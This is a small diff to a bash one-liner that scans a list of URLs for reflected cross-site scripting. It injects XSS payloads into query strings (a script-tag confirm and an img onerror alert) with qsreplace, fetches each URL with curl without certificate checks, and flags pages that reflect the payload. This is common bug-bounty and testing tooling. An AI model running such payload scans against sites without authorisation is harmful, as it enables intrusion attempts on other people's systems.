@@ -1,2 +1,3 @@
+#!/bin/bash
 urlsFile=$1
-cat $urlsFile | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do; do curl --silent --insecure $host | grep -qs "<script>confirm(1)" && echo "[*] XSS REFLECTED HERE $host" ; done
+cat $urlsFile | qsreplace '"><img src=x onerror=alert`1` />' | while read host do; do curl --silent --insecure $host | grep -qs "<img src=x" && echo "[*] REFLECTION FOUND $host"; done 
